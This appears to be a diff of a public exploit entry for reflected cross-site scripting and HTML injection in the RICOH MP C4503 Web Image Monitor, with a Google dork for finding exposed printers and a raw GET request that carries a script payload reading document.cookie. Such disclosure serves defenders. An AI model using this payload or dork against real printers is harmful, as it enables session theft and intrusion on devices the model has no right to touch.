@@ -1,12 +1,33 @@
 
-Affected Product: RICOH MP C4503 Web Image Monitor
-Affected Version: 1.06, 1.09, 1.14
+# Exploit Title: RICOH MP C4503 Web Image Monitor XSS and HTML injection
+# Discovered Date: 03/10/2019
+# Google Dork: inurl:/web/guest/en/websys/webArch/mainFrame.cgi
+# Exploit Author: Ramikan
+# Vendor Homepage: https://www.ricoh.co.uk
+# Affected Product: RICOH MP C4503 Web Image Monitor
+# Affected Version: 1.06, 1.09, 1.14
+# Vendor Fix: Unknown
+# CVE: 
+# Category: Web Apps, Hardware
+# Reference : https://github.com/Ramikan/Vulnerabilities/blob/master/RICOH MP C4503 Web Image Monitor XSS and HTML injection
+# Blog: www.fact-in-hack.blogspot.com
+***************************************************************************************************************************
+
 
 Vulnerability: Cross site scripting (Reflected) & HTML injection
 
+***************************************************************************************************************************
+
+Description:
+ 
+The web portal of RICOH MP C4503 Web Image Monitor application is vulnerable to the HTML injection, reflected cross site scripting and sensitive data disclosure.
+
 Request made to the http site of the printer and the application makes a redirect to https site, which is injecting the URI value in the response in oder to redirect to the site url.
 
+***************************************************************************************************************************
 Request:
+
+***************************************************************************************************************************
 
 GET /web/guest/en/websys/webArch/mainFrame.cgi'/><script>alert(document.cookie)</script><h1>hello</h1><1 HTTP/1.1
 Host: 192.168.10.40
